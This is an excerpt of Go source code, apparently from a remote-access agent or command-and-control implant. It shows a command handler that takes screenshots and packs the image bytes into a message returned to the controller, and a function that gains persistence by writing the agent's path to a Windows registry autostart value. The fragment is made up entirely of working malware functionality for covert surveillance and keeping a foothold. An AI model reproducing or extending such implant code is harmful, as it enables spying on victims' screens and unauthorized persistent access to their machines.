...
func executeCommand(commandObj utils.Command, index int) (response string) {
	...
	case "screenshot":
		response = takeScreenshot(commandObj, index)
...
func takeScreenshot(screenshotcommandObj utils.Command, index int) string {
	...
	// convert image to bytes so it can be send throught the connection
	buf := new(bytes.Buffer)
	err := jpeg.Encode(buf, myImg, nil)

	if err != nil {
		response = "[-] Error to convert image to bytes"
	}

	imgBytes := buf.Bytes()

	message.Commands[index].File.Content = imgBytes // save the content of the image in bytes
	message.Commands[index].File.Name = message.AgentId + "_screenshot.png"

	if err != nil {
		response = "[-] Error to save image"
	}
...
func persist() string {
	...
	fmt.Println("Entrou persist")

	response := "[+] Persistence create successfully."

	if message.AgentOS == "windows" {

		agentPath := message.AgentPWD + "\\" + os.Args[0]
		...
		if err != nil {
			response = "[-] Error to get registry address: " + err.Error()
		}
		if err := k.SetStringValue("job", agentPath); err != nil {
			response = "[-] Error to create registry: " + err.Error()
		}
		if err := k.Close(); err != nil {
			response = "[-] Error to close registry: " + err.Error()
		}

	} else {
		response = "[-] Not implemented for this OS: " + message.AgentOS
	}
